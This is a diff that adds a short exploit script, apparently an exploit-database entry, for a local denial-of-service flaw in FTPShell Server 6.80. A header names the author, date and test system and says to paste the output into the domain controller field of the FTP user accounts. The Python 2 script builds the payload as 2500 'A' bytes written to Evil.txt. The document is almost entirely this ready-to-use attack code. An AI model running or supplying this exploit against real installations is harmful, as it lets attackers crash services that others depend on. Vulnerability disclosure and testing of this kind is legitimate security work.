@@ -1,0 +1,20 @@
+# Exploit Title: FTPShell Server 6.80 - Local Denial of Service
+# Exploit Author: Hashim Jawad
+# Date: 2018-05-23
+# Vendor Homepage: http://www.ftpshell.com/
+# Vulnerable Software: http://www.ftpshell.com/downloadserver.htm
+# Tested on: Windows 7 Enterprise - SP1 (x86)
+# Steps to reproduce: under FTP user accounts paste contents of Evil.txt in domain controller field
+
+#!/usr/bin/python
+
+buffer = '\x41' * 2500
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except Exception as e:
+	print e
